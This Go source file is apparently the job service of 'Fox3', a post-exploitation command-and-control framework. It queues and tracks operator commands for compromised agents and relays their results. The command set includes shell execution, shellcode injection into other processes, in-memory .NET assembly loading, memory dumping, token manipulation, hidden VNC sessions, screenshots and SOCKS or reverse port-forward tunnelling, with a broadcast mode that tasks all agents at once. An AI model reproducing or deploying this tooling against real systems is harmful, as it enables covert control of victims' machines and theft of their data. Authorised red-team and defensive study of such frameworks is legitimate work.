/*
Fox3 is a post-exploitation command and control framework.

This file is part of Fox3.
Copyright (C) 2024 Russel Van Tuyl

Fox3 is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
any later version.

Fox3 is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with Fox3.  If not, see <http://www.gnu.org/licenses/>.
*/

// Package job is a service used to interact with Agent Jobs
package job

import (
	// Standard
	"encoding/base64"
	"fmt"
	"log/slog"
	"os"
	"path/filepath"
	"strconv"
	"strings"
	"time"

	// 3rd Party
	"github.com/google/uuid"

	// Fox3 Message
	"github.com/nzyuko/fox3/v2/pkg/fox3-message"
	"github.com/nzyuko/fox3/v2/pkg/fox3-message/jobs"

	// Internal
	"github.com/nzyuko/fox3/v2/pkg/client/message"
	memoryMessage "github.com/nzyuko/fox3/v2/pkg/client/message/memory"
	"github.com/nzyuko/fox3/v2/pkg/core"
	"github.com/nzyuko/fox3/v2/pkg/events"
	infoJobs "github.com/nzyuko/fox3/v2/pkg/jobs"
	"github.com/nzyuko/fox3/v2/pkg/jobs/memory"
	"github.com/nzyuko/fox3/v2/pkg/modules/hvnc"
	"github.com/nzyuko/fox3/v2/pkg/modules/rportfwd"
	"github.com/nzyuko/fox3/v2/pkg/modules/socks"
	"github.com/nzyuko/fox3/v2/pkg/push"
	"github.com/nzyuko/fox3/v2/pkg/services/agent"
)

// Service holds references to repositories to manage Job objects
type Service struct {
	jobRepo      infoJobs.Repository
	messageRepo  message.Repository
	agentService *agent.Service
}

// memoryService is an in-memory instantiation of the Agent service so that it can be used by others
var memoryService *Service

// NewJobService is a factory to create a Job service to be used by other packages or services
func NewJobService() *Service {
	if memoryService == nil {
		memoryService = &Service{
			jobRepo:      WithJobMemoryRepository(),
			messageRepo:  withMemoryClientMessageRepository(),
			agentService: agent.NewAgentService(),
		}
		// Start the tunnel relay loops
		go memoryService.socksJobs()
		go memoryService.rportfwdJobs()
		go memoryService.hvncJobs()
	}
	return memoryService
}

func WithJobMemoryRepository() infoJobs.Repository {
	return memory.NewRepository()
}

func withMemoryClientMessageRepository() message.Repository {
	return memoryMessage.NewRepository()
}

func (s *Service) Add(agentID uuid.UUID, jobType string, jobArgs []string) (string, error) {
	var job jobs.Job

	switch jobType {
	case "agentInfo":
		job.Type = jobs.CONTROL
		job.Payload = jobs.Command{
			Command: "agentInfo",
		}
	case "download":
		job.Type = jobs.FILETRANSFER
		p := jobs.FileTransfer{
			FileLocation: jobArgs[0],
			IsDownload:   false,
		}
		job.Payload = p
	case "cd":
		job.Type = jobs.NATIVE
		p := jobs.Command{
			Command: "cd",
			Args:    jobArgs[0:],
		}
		job.Payload = p
	case "changelistener":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) >= 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "connect":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
		}
		if len(jobArgs) > 0 {
			p.Args = jobArgs[0:]
		}
		job.Payload = p
	case "CreateProcess":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "env":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "exit":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
		}
		job.Payload = p
	case "ifconfig":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
		}
	case "initialize":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
		}
		job.Payload = p
	case "invoke-assembly":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("exected 1 argument for the invoke-assembly command, received: %+v", jobArgs)
		}
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: "clr",
			Args:    append([]string{jobType}, jobArgs...),
		}
	case "ja3":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}

		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "killdate":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobArgs[0],
		}
		if len(jobArgs) == 2 {
			p.Args = jobArgs[1:]
		}
		job.Payload = p
	case "killprocess":
		job.Type = jobs.NATIVE
		p := jobs.Command{
			Command: "killprocess",
			Args:    jobArgs,
		}
		job.Payload = p
	case "link":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "link",
			Args:    jobArgs,
		}
		job.Payload = p
	case "listener":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "listener",
			Args:    jobArgs,
		}
		job.Payload = p
	case "list-assemblies":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: "clr",
			Args:    []string{"list-assemblies"},
		}
	case "load-assembly":
		// jobArgs[0] - base64 encoded assembly
		// jobArgs[1] - Assembly name
		// jobArgs[2] - calculated SHA256 hash
		if len(jobArgs) < 3 {
			return "", fmt.Errorf("the load-assembly command requires three agruments, have %d", len(jobArgs))
		}
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: "clr",
			Args:    []string{jobType, jobArgs[0], jobArgs[1]},
		}
	case "load-clr":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("exected 1 argument for the load-clr command, received: %+v", jobArgs)
		}
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: "clr",
			Args:    append([]string{jobType}, jobArgs...),
		}
	case "ls":
		job.Type = jobs.NATIVE
		p := jobs.Command{
			Command: "ls", // TODO This should be in the jobType position
		}

		if len(jobArgs) > 0 {
			p.Args = jobArgs[0:]
		} else {
			p.Args = []string{"./"}
		}
		job.Payload = p
	case "maxretry":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "memory":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "memfd":
		if len(jobArgs) < 1 {
			return "", fmt.Errorf("expected 1 argument for the memfd command, received %d", len(jobArgs))
		}
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "Minidump":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "netstat":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "nslookup":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "padding":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "parrot":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "pipes":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "pipes",
		}
		job.Payload = p
	case "ps":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "ps",
		}
		job.Payload = p
	case "pwd":
		job.Type = jobs.NATIVE
		p := jobs.Command{
			Command: "pwd",
		}
		job.Payload = p
	case "rm":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs[0:1],
		}
	case "run", "exec":
		job.Type = jobs.CMD
		payload := jobs.Command{
			Command: jobArgs[0],
		}
		if len(jobArgs) > 1 {
			payload.Args = jobArgs[1:]
		}
		job.Payload = payload
	case "runas":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "sdelete":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "shell":
		job.Type = jobs.CMD
		payload := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = payload
	case "shellcode":
		// jobArgs[0] - base64 encoded shellcode
		// jobArgs[1] - method
		// jobArgs[2] - PID
		job.Type = jobs.SHELLCODE
		payload := jobs.Shellcode{
			Method: strings.ToLower(jobArgs[1]),
		}

		if payload.Method == "self" {
			payload.Bytes = jobArgs[0]
		} else if payload.Method == "remote" || payload.Method == "rtlcreateuserthread" || payload.Method == "userapc" {
			if len(jobArgs) < 3 {
				return "", fmt.Errorf("the '%s' shellcode command requires three agruments, have %d", payload.Method, len(jobArgs))
			}
			i, err := strconv.Atoi(jobArgs[2])
			if err != nil {
				return "", err
			}
			payload.PID = uint32(i)
			payload.Bytes = jobArgs[0]
		}
		job.Payload = payload
	case "skew":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "sleep":
		job.Type = jobs.CONTROL
		p := jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
		job.Payload = p
	case "ssh":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "token":
		job.Type = jobs.MODULE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "touch":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "unlink":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "unlink",
			Args:    jobArgs,
		}
		job.Payload = p
	case "upload":
		job.Type = jobs.FILETRANSFER
		p := jobs.FileTransfer{
			FileLocation: jobArgs[1],
			FileBlob:     jobArgs[0],
			IsDownload:   true,
		}
		job.Payload = p
	case "uptime":
		job.Type = jobs.MODULE
		p := jobs.Command{
			Command: "uptime",
		}
		job.Payload = p
	// ── Agent-side NATIVE commands ──────────────────────────────────────────
	case "rportfwd_start", "rportfwd_stop":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: jobType,
			Args:    jobArgs,
		}
	case "hvnc_start":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: "hvnc_start",
			Args:    jobArgs,
		}
		// Note: session is registered when agent responds with conn_id in the result
	case "hvnc_stop":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: "hvnc_stop",
		}
		hvnc.Unregister(agentID)
	case "screenshot":
		job.Type = jobs.NATIVE
		job.Payload = jobs.Command{
			Command: "screenshot",
		}
	default:
		return "", fmt.Errorf("unknown command: %q. Valid commands:\n"+
			"  Info:      agentInfo, ps, netstat, uptime, memory, ifconfig, nslookup, env, pipes, ls, pwd\n"+
			"  Exec:      shell, run, exec, runas, CreateProcess\n"+
			"  Files:     upload, download, cd, rm, touch, sdelete\n"+
			"  Control:   sleep, killdate, maxretry, padding, skew, exit, ja3, parrot\n"+
			"  Modules:   link, unlink, listener, load-assembly, invoke-assembly, list-assemblies, load-clr, memfd, Minidump, shellcode, ssh, token\n"+
			"  Network:   sock_start, sock_stop, rportfwd_start, rportfwd_stop\n"+
			"  Special:   hvnc_start, hvnc_stop, screenshot\n"+
			"  Help:      Use 'help' on the agent for the full built-in command list", jobType)
	}

	return s.AddJobChannel(agentID, &job, jobArgs)
}

// AddJobChannel adds an already built Agent Job to the agent's job channel to be sent to the agent when it checks in.
// A server-side job tracking structure is also added to track job status
func (s *Service) AddJobChannel(agentID uuid.UUID, job *jobs.Job, jobArgs []string) (results string, err error) {
	agents := s.agentService.Agents()
	// If the Agent is set to broadcast identifier for ALL agents
	if agentID.String() == "ffffffff-ffff-ffff-ffff-ffffffffffff" {
		if len(agents) <= 0 {
			return results, fmt.Errorf("there are 0 available agents, no jobs were created")
		}
		results = "Creating jobs for all agents through broadcast identifier ffffffff-ffff-ffff-ffff-ffffffffffff"
		for _, a := range agents {
			// Because the job structure is a pointer, we need to clear out the job ID for each iteration
			job.ID = ""
			err = s.buildJob(a.ID(), job, jobArgs)
			if err != nil {
				return results, err
			}
			results += fmt.Sprintf("\n\tCreated job %s for agent %s at %s", job.ID, a.ID(), time.Now().UTC().Format(time.RFC3339))
		}
	} else {
		// A single Agent
		err = s.buildJob(agentID, job, jobArgs)
		if err != nil {
			return results, err
		}
		results += fmt.Sprintf("Created job %s for agent %s at %s", job.ID, agentID, time.Now().UTC().Format(time.RFC3339))
	}
	return results, nil
}

// buildJob fills in the server-side derived fields for an Agent's job and then adds it to the Agent's job channel
// to be sent to the agent when it checks in.
// A server-side job tracking structure is also added to track job status.
// The job is also added to the server-side agent log file
func (s *Service) buildJob(agentID uuid.UUID, job *jobs.Job, jobArgs []string) error {
	a, err := s.agentService.Agent(agentID)

	if err != nil {
		return fmt.Errorf("pkg/server/jobs.buildJob(): there was an error adding a job because %s is an unknown agent", agentID)
	}
	job.AgentID = agentID

	var command string
	// Update the Command field of the Job info structure
	switch job.Type {
	case jobs.CONTROL, jobs.MODULE, jobs.NATIVE:
		cmd := job.Payload.(jobs.Command)
		if job.Type == jobs.MODULE {
			if strings.ToLower(cmd.Command) == "clr" && strings.ToLower(cmd.Args[0]) == "load-assembly" {
				if len(jobArgs) > 2 {
					msg := fmt.Sprintf("loading assembly from %s with a SHA256: %s to agent", jobArgs[0], jobArgs[2])
					a.Log(msg)
				}
			}
		}
		args := fmt.Sprintf("%s", strings.Join(cmd.Args, " "))
		// Truncate to 30 characters
		if len(args) > 30 {
			args = fmt.Sprintf("%s...", args[:30])
		}
		command = fmt.Sprintf("%s %s", cmd.Command, args)
	case jobs.CMD:
		cmd := job.Payload.(jobs.Command)
		args := fmt.Sprintf("%s", strings.Join(cmd.Args, " "))
		// Truncate to 30 characters
		if len(args) > 30 {
			args = fmt.Sprintf("%s...", args[:30])
		}
		if strings.ToLower(cmd.Command) == "shell" {
			command = strings.TrimSpace(fmt.Sprintf("%s %s", cmd.Command, args))
		} else {
			command = strings.TrimSpace(fmt.Sprintf("run %s %s", cmd.Command, args))
		}
	case jobs.FILETRANSFER:
		cmd := job.Payload.(jobs.FileTransfer)
		if cmd.IsDownload {
			// Upload to agent (the server is uploading a file that the agent is downloading the file from the server)
			if len(jobArgs) > 2 {
				msg := fmt.Sprintf(
					"Uploading file from server at %s of size %s bytes and SHA-256: %x to agent at %s",
					jobArgs[0],
					jobArgs[3],
					jobArgs[2],
					jobArgs[1],
				)
				a.Log(msg)
				command = fmt.Sprintf("upload %s %s", jobArgs[0], jobArgs[1])
			}
		} else {
			// Download from agent (the server is download a file to the agent is uploading a file to the server)
			if len(jobArgs) > 0 {
				command = fmt.Sprintf("download %s", jobArgs[0])
				a.Log(fmt.Sprintf("Downloading file from agent at %s\n", jobArgs[0]))
			}
		}
	case jobs.SHELLCODE:
		cmd := job.Payload.(jobs.Shellcode)
		command = fmt.Sprintf("shellcode %s %d length %d", cmd.Method, cmd.PID, len(cmd.Bytes))
	case jobs.SOCKS:
		conn := job.Payload.(jobs.Socks)
		command = fmt.Sprintf("SOCKS connection %s packet %d", conn.ID, conn.Index)
	default:
		command = fmt.Sprintf("%s %+v", job.Type, job.Payload)
	}

	// Create Job info structure
	var jobInfo infoJobs.Info
	if job.Type != jobs.SOCKS {
		jobInfo = infoJobs.NewInfo(agentID, job.Type.String(), command)
	} else {
		// SOCKS jobs create their own job ID and token that are used through the lifetime of the connection
		jobInfo = infoJobs.NewInfoWithID(agentID, job.Type.String(), command, job.ID, job.Token)
	}

	if job.Token == uuid.Nil {
		job.Token = jobInfo.Token()
	}

	if job.ID == "" {
		job.ID = jobInfo.ID()
	}

	// Add the job to the server side job list
	s.jobRepo.Add(*job, jobInfo)

	// Log the job
	msg := fmt.Sprintf("Created job Type:%s, ID:%s, Status:%s, Command:%s",
		job.Type,
		job.ID,
		"Created",
		command,
	)
	a.Log(msg)
	return nil
}

// checkJob verifies that the input job message contains the expected token and was not yet completed
func (s *Service) checkJob(job jobs.Job) error {
	// Check to make sure agent UUID is in dataset
	if !s.agentService.Exist(job.AgentID) {
		return fmt.Errorf("job %s was for an invalid agent %s", job.ID, job.AgentID)
	}
	j, err := s.jobRepo.GetInfo(job.ID)
	if err != nil {
		return fmt.Errorf("pkg/services/job.checkJob: %s", err)
	}

	if job.Token != j.Token() {
		return fmt.Errorf("job %s for agent %s did not contain the correct token. Expected: %s, Got: %s", job.ID, job.AgentID, j.Token(), job.Token)
	}
	if j.Status() == infoJobs.COMPLETE {
		return fmt.Errorf("job %s for agent %s was previously completed on %s", job.ID, job.AgentID, j.Completed())
	}
	if j.Status() == infoJobs.CANCELED {
		return fmt.Errorf("job %s for agent %s was previously canceled on", job.ID, job.AgentID)
	}
	return nil
}

// Clear removes any jobs in the queue that have been created, but NOT sent to the agent
func (s *Service) Clear(agentID uuid.UUID) error {
	return s.jobRepo.Clear(agentID)
}

// ClearAll removes all unsent jobs across all agents
func (s *Service) ClearAll() error {
	return s.jobRepo.ClearAll()
}

// ClearCompleted removes all completed/returned jobs for the given agent
func (s *Service) ClearCompleted(agentID uuid.UUID) error {
	return s.jobRepo.ClearCompleted(agentID)
}

// fileTransfer handles file upload/download operations
func (s *Service) fileTransfer(agentID uuid.UUID, p jobs.FileTransfer) error {
	// Check to make sure it is a known agent
	if !s.agentService.Exist(agentID) {
		return fmt.Errorf("%s is not a valid agent", agentID)
	}

	if p.IsDownload {
		current, err := os.Getwd()
		if err != nil {
			return fmt.Errorf("there was an error getting the current working directory: %s", err)
		}
		agentsDir := filepath.Join(current, "data", "agents")
		_, f := filepath.Split(p.FileLocation) // We don't need the directory part for anything
		if _, errD := os.Stat(agentsDir); os.IsNotExist(errD) {
			errorMessage := fmt.Errorf("there was an error locating the agent's directory:\r\n%s", errD.Error())
			err = s.agentService.Log(agentID, errorMessage.Error())
			if err != nil {
				return fmt.Errorf("there were to errors:\n\t%s\n\t%s", errorMessage, err)
			}
			return errorMessage
		}
		userMessage := message.NewMessage(message.Success, fmt.Sprintf("Results for %s at %s", agentID, time.Now().UTC().Format(time.RFC3339)))
		s.messageRepo.Add(userMessage)
		downloadBlob, downloadBlobErr := base64.StdEncoding.DecodeString(p.FileBlob)

		if downloadBlobErr != nil {
			errorMessage := fmt.Errorf("there was an error decoding the fileBlob:\r\n%s", downloadBlobErr.Error())
			err = s.agentService.Log(agentID, errorMessage.Error())
			if err != nil {
				return fmt.Errorf("there were to errors:\n\t%s\n\t%s", errorMessage, err)
			}
			return errorMessage
		}
		downloadFile := filepath.Join(agentsDir, agentID.String(), f)
		writingErr := os.WriteFile(downloadFile, downloadBlob, 0600)
		if writingErr != nil {
			errorMessage := fmt.Errorf("there was an error writing to -> %s:\r\n%s", p.FileLocation, writingErr.Error())
			err = s.agentService.Log(agentID, errorMessage.Error())
			if err != nil {
				return fmt.Errorf("there were to errors:\n\t%s\n\t%s", errorMessage, err)
			}
			return errorMessage
		}
		successMessage := fmt.Sprintf("Successfully downloaded file %s with a size of %d bytes from agent %s to %s",
			p.FileLocation,
			len(downloadBlob),
			agentID.String(),
			downloadFile)

		userMessage = message.NewMessage(message.Success, successMessage)
		s.messageRepo.Add(userMessage)

		err = s.agentService.Log(agentID, successMessage)
		if err != nil {
			return err
		}
	}

	return nil
}

// Get returns a list of jobs that need to be sent to the agent
func (s *Service) Get(agentID uuid.UUID) ([]jobs.Job, error) {
	return s.jobRepo.GetJobs(agentID)
}

// GetAll returns a map of all jobs in the job repository
func (s *Service) GetAll() []infoJobs.Info {
	var returnJobs []infoJobs.Info
	for _, job := range s.jobRepo.GetAll() {
		returnJobs = append(returnJobs, job)
	}
	return returnJobs
}

// GetAllActive returns a list of all jobs that are not complete or canceled
func (s *Service) GetAllActive() []infoJobs.Info {
	var returnJobs []infoJobs.Info
	for _, job := range s.jobRepo.GetAll() {
		if job.Status() != infoJobs.COMPLETE && job.Status() != infoJobs.CANCELED {
			returnJobs = append(returnJobs, job)
		}
	}
	return returnJobs
}

func (s *Service) GetAgentActive(agentID uuid.UUID) ([]infoJobs.Info, error) {
	var returnJobs []infoJobs.Info
	if !s.agentService.Exist(agentID) {
		return returnJobs, fmt.Errorf("%s is not a valid agent", agentID)
	}

	for _, job := range s.jobRepo.GetAll() {
		if job.AgentID() == agentID {
			if job.Status() != infoJobs.COMPLETE && job.Status() != infoJobs.CANCELED && job.AgentID() == agentID {
				returnJobs = append(returnJobs, job)
			}
		}
	}
	return returnJobs, nil
}

// GetTableActive returns a list of rows that contain information about active jobs
func (s *Service) GetTableActive(agentID uuid.UUID) ([][]string, error) {

	var agentJobs [][]string
	if !s.agentService.Exist(agentID) {
		return agentJobs, fmt.Errorf("%s is not a valid agent", agentID)
	}

	for id, job := range s.jobRepo.GetAll() {
		if job.AgentID() == agentID {
			//message("debug", fmt.Sprintf("GetTableActive(%s) ID: %s, Job: %+v", agentID.String(), id, job))
			var status string
			switch job.Status() {
			case infoJobs.ACTIVE:
				status = "Active"
			case infoJobs.CREATED:
				status = "Created"
			case infoJobs.SENT:
				status = "Sent"
			case infoJobs.RETURNED:
				status = "Returned"
			default:
				status = fmt.Sprintf("Unknown job status: %d", job.Status())
			}
			var zeroTime time.Time
			// Don't add completed or canceled jobs
			if job.Status() != infoJobs.COMPLETE && job.Status() != infoJobs.CANCELED {
				var sent string
				if job.Sent() != zeroTime {
					sent = job.Sent().Format(time.RFC3339)
				}
				// <JobID>, <Command>, <JobStatus>, <Created>, <Sent>
				agentJobs = append(agentJobs, []string{
					id,
					job.Command(),
					status,
					job.Created().Format(time.RFC3339),
					sent,
				})
			}
		}
	}
	return agentJobs, nil
}

// GetTableActiveWithResults returns active jobs plus recently completed jobs with output.
func (s *Service) GetTableActiveWithResults(agentID uuid.UUID) ([][]string, error) {
	rows, err := s.GetTableActive(agentID)
	if err != nil {
		return rows, err
	}

	// Append recently completed jobs from repository (last 50)
	completed, err := s.jobRepo.GetCompletedRows(agentID, 50)
	if err != nil {
		return rows, err
	}
	rows = append(rows, completed...)
	return rows, nil
}

// GetTableAll returns all unsent jobs to be displayed as a table
func (s *Service) GetTableAll() [][]string {
	var agentJobs [][]string

	for id, job := range s.jobRepo.GetAll() {
		var status string
		switch job.Status() {
		case infoJobs.CREATED:
			status = "Created"
		case infoJobs.SENT:
			status = "Sent"
		case infoJobs.RETURNED:
			status = "Returned"
		default:
			status = fmt.Sprintf("Unknown job status: %d", job.Status())
		}
		if job.Status() != infoJobs.COMPLETE && job.Status() != infoJobs.CANCELED {
			var zeroTime time.Time
			var sent string
			if job.Sent() != zeroTime {
				sent = job.Sent().Format(time.RFC3339)
			}

			agentJobs = append(agentJobs, []string{
				job.AgentID().String(),
				id,
				job.Command(),
				status,
				job.Created().Format(time.RFC3339),
				sent,
			})
		}
	}
	return agentJobs
}

// Handler evaluates a message sent in by the agent and the subsequently executes any corresponding tasks
func (s *Service) Handler(agentJobs []jobs.Job) error {
	// Iterate over each job
	for _, job := range agentJobs {
		// ── Fast path: SOCKS tunnel traffic (HVNC frames, port-forward, etc.)
		// Skip agent lookup and info tracking — these are high-frequency packets.
		if job.Type == jobs.SOCKS {
			sp, ok := job.Payload.(jobs.Socks)
			if ok {
				if hvnc.IsKnown(sp.ID) {
					hvnc.In(job)
				} else if rportfwd.IsKnown(sp.ID) {
					rportfwd.In(job)
				} else {
					socks.In(job)
				}
			}
			continue
		}

		// Make sure the Agent is known to the server
		if !s.agentService.Exist(job.AgentID) {
			userMessage := message.NewMessage(message.Warn, fmt.Sprintf("Job %s was for an invalid agent %s", job.ID, job.AgentID))
			s.messageRepo.Add(userMessage)
			continue
		}

		a, err := s.agentService.Agent(job.AgentID)
		if err != nil {
			return err
		}

		// Non-SOCKS jobs: require Info tracking
		slog.Debug("Handler: GetInfo", "job", job.ID, "agent", job.AgentID)
		jobInfo, err := s.jobRepo.GetInfo(job.ID)
		if err != nil {
			return fmt.Errorf("pkg/services/job.Handler(): %s", err)
		}

		// Verify that the job contains the correct token and that it was not yet completed
		slog.Debug("Handler: checkJob", "job", job.ID)
		err = s.checkJob(job)
		if err != nil {
			// Agent will send back error messages that are not the result of a job
			if job.Type != jobs.RESULT {
				return err
			}
			if core.Debug {
				fmt.Printf("Received %s message without job token: %s\n", job.Type, err)
			}
		}
		slog.Debug("Handler: processing type", "job", job.ID, "type", job.Type)
		switch job.Type {
		case jobs.RESULT:
			a.Log(fmt.Sprintf("Results for job: %s", job.ID))

			userMessage := message.NewMessage(message.Note, fmt.Sprintf("Results of job %s for agent %s at %s", job.ID, job.AgentID, time.Now().UTC().Format(time.RFC3339)))
			s.messageRepo.Add(userMessage)

			result, ok := job.Payload.(jobs.Results)
			if !ok {
				slog.Warn("Handler: RESULT type assertion failed, trying map fallback", "job", job.ID, "agent", job.AgentID, "payload_type", fmt.Sprintf("%T", job.Payload))
				// Fallback: payload may be map[string]interface{} if JSON decoder didn't resolve concrete type
				if m, mok := job.Payload.(map[string]interface{}); mok {
					if v, has := m["stdout"]; has {
						if s, sok := v.(string); sok {
							result.Stdout = s
						}
					}
					if v, has := m["stderr"]; has {
						if s, sok := v.(string); sok {
							result.Stderr = s
						}
					}
					ok = true
				}
				if !ok {
					continue
				}
			}
			if len(result.Stdout) > 0 {
				a.Log(fmt.Sprintf("Command Results (stdout):\r\n%s", result.Stdout))
				userMessage = message.NewMessage(message.Success, result.Stdout)
				s.messageRepo.Add(userMessage)

				// Check if this is an hvnc_start result containing a conn_id
				s.handleHvncResult(job.AgentID, result.Stdout)

				// Store output for REST API
				_ = s.jobRepo.UpdateOutput(job.ID, result.Stdout)
			}
			if len(result.Stderr) > 0 {
				a.Log(fmt.Sprintf("Command Results (stderr):\r\n%s", result.Stderr))
				userMessage = message.NewMessage(message.Warn, result.Stderr)
				s.messageRepo.Add(userMessage)
			}
		case jobs.AGENTINFO:
			ai, aiOk := job.Payload.(messages.AgentInfo)
			if !aiOk {
				slog.Warn("Handler: AGENTINFO type assertion failed", "job", job.ID, "payload_type", fmt.Sprintf("%T", job.Payload))
				continue
			}
			err = s.agentService.UpdateAgentInfo(job.AgentID, ai)
			if err != nil {
				return err
			}
			msg := fmt.Sprintf("Results of job %s for agent %s at %s", job.ID, job.AgentID, time.Now().UTC().Format(time.RFC3339))
			msg += fmt.Sprintf("\n\tConfiguration data received for Agent %s and updated. Issue the \"info\" command to view it.", job.AgentID)
			userMessage := message.NewMessage(message.Note, msg)
			s.messageRepo.Add(userMessage)
		case jobs.FILETRANSFER:
			ft, ftOk := job.Payload.(jobs.FileTransfer)
			if !ftOk {
				slog.Warn("Handler: FILETRANSFER type assertion failed", "job", job.ID, "payload_type", fmt.Sprintf("%T", job.Payload))
				continue
			}
			err = s.fileTransfer(job.AgentID, ft)
			if err != nil {
				return err
			}
		}
		// Update Jobs Info structure
		// Re-read jobInfo in case UpdateOutput already stored output
		slog.Debug("Handler: re-read + complete", "job", job.ID)
		jobInfo, err = s.jobRepo.GetInfo(job.ID)
		if err != nil {
			return fmt.Errorf("pkg/services/job.Handler(): re-read info: %s", err)
		}
		jobInfo.Complete()
		err = s.jobRepo.UpdateInfo(jobInfo)
		if err != nil {
			return fmt.Errorf("pkg/services/job.Handler(): %s", err)
		}
		slog.Debug("Handler: job done", "job", job.ID)

		// Notify frontend that a job completed
		events.Publish(events.Event{
			Type:    events.EventJobComplete,
			Payload: map[string]string{"agent_id": job.AgentID.String(), "job_id": job.ID},
		})
	}
	return nil
}

// handleHvncResult checks if a result contains an HVNC conn_id and registers the session
func (s *Service) handleHvncResult(agentID uuid.UUID, stdout string) {
	// Look for "HVNC started, conn_id=<uuid>" in the result
	const prefix = "conn_id="
	idx := strings.Index(stdout, prefix)
	if idx < 0 {
		return
	}
	connStr := stdout[idx+len(prefix):]
	// Trim to UUID length (36 chars)
	if len(connStr) >= 36 {
		connStr = connStr[:36]
	}
	connID, err := uuid.Parse(connStr)
	if err != nil {
		slog.Warn("Failed to parse HVNC conn_id from result", "stdout", stdout, "error", err)
		return
	}
	hvnc.Register(agentID, connID)
	slog.Info("HVNC session registered from agent result", "agent", agentID, "conn_id", connID)
}

// tunnelRelay is a fast-path relay for high-throughput tunnel traffic (SOCKS, rportfwd, HVNC).
// It skips the heavy buildJob() path (agent lookup, string formatting, Info tracking, logging) and
// enqueues directly via AddFast. Multiple goroutines can safely read from the same channel.
func (s *Service) tunnelRelay(ch <-chan jobs.Job) {
	for job := range ch {
		if job.Token == uuid.Nil {
			job.Token = uuid.New()
		}
		if job.ID == "" {
			job.ID = uuid.NewString()
		}
		slog.Debug("tunnelRelay enqueue", "agent", job.AgentID, "type", job.Type, "id", job.ID)
		s.jobRepo.AddFast(job)
		push.Notify(job.AgentID)
	}
}

// socksJobs spins up parallel relay workers for SOCKS tunnel traffic.
func (s *Service) socksJobs() {
	for i := 0; i < 4; i++ {
		go s.tunnelRelay(socks.JobsOut)
	}
}

// rportfwdJobs spins up parallel relay workers for reverse port-forward tunnel traffic.
func (s *Service) rportfwdJobs() {
	for i := 0; i < 2; i++ {
		go s.tunnelRelay(rportfwd.JobsOut)
	}
}

// hvncJobs spins up parallel relay workers for HVNC tunnel traffic.
func (s *Service) hvncJobs() {
	for i := 0; i < 2; i++ {
		go s.tunnelRelay(hvnc.JobsOut)
	}
}
